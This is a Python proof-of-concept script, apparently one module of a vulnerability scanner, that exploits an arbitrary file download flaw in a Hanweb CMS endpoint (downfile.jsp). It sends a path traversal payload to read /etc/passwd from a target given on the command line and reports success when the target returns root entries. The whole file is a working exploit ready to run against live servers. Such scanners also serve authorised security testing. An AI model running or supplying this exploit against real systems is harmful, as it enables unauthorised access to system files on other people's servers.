#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 大汉downfile.jsp 任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2015-092339
author: Lucifer
description: 文件/vc/vc/columncount/downfile.jsp中,参数filename存在任意文件下载。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class hanweb_downfile_filedownload:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/vc/vc/columncount/downfile.jsp?savename=a.txt&filename=../../../../../../../../etc/passwd"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"root:" in req.text and r"/bin/bash" in req.text:
                printGreen("[+]Success:存在大汉downfile.jsp 任意文件下载漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在hanweb_downfile_filedownload漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = hanweb_downfile_filedownload(sys.argv[1])
    testVuln.run()